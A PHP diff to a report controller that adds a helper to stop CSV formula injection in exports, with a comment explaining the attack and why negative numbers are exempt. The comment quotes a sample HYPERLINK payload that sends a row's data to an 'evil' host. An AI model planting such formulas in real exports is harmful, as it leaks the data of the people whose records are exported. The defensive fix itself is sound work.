@@ -48,7 +48,7 @@ class ReportController extends Controller
 
             foreach ($rows as $row) {
                 fputcsv($handle, array_map(
-                    fn (string $key) => $row[$key] ?? '',
+                    fn (string $key) => self::neutralizeFormula($row[$key] ?? ''),
                     array_keys($columns)
                 ));
             }
@@ -84,6 +84,51 @@ class ReportController extends Controller
         ])->setPaper('a4', 'landscape');
 
         return $pdf->download($definition->key().'-'.now()->format('Y-m-d-His').'.pdf');
+    }
+
+    /**
+     * Stops a spreadsheet from executing a cell that came out of the database.
+     *
+     * THE ATTACK. Excel, LibreOffice and Sheets treat a cell beginning with
+     * `=`, `+`, `-` or `@` as a formula, not as text. Every free-text field in
+     * this system reaches a CSV export - a bird's name, a note, a cause of
+     * death - and a record keeper can type anything into all of them. A bird
+     * named `=HYPERLINK("http://evil/?"&A1,"Open")` exfiltrates the row the
+     * moment the farm opens the export; the DDE variants can launch a process.
+     * Nothing is wrong with the file, and nothing in this application is
+     * compromised - the spreadsheet does it, which is exactly why it survives
+     * output escaping and has to be handled at the point of export.
+     *
+     * THE FIX. Prefix the offending cell with an apostrophe, which every
+     * spreadsheet reads as "the rest of this is literal text" and does not
+     * display.
+     *
+     * NUMBERS ARE DELIBERATELY EXEMPT. `-12` and `-0.5` start with a dangerous
+     * character and are the whole point of the numeric columns; quoting them
+     * would turn every negative figure into text and break sorting and SUM()
+     * on a report whose numbers are the reason it exists. A value that is
+     * genuinely numeric cannot carry a payload, so it is passed through.
+     */
+    private static function neutralizeFormula(string|int|float|null $value): string|int|float
+    {
+        if ($value === null) {
+            return '';
+        }
+
+        if (! is_string($value) || $value === '') {
+            return $value;
+        }
+
+        if (is_numeric($value)) {
+            return $value;
+        }
+
+        // Leading whitespace is stripped by the spreadsheet before it decides
+        // whether the cell is a formula, so a tab or a carriage return in front
+        // of the `=` hides the payload from a naive first-character check.
+        return preg_match('/^[\t\r\n ]*[=+\-@]/', $value) === 1
+            ? "'".$value
+            : $value;
     }
 
     /** Resolves the report, authorizes it, and applies the request's filters. */
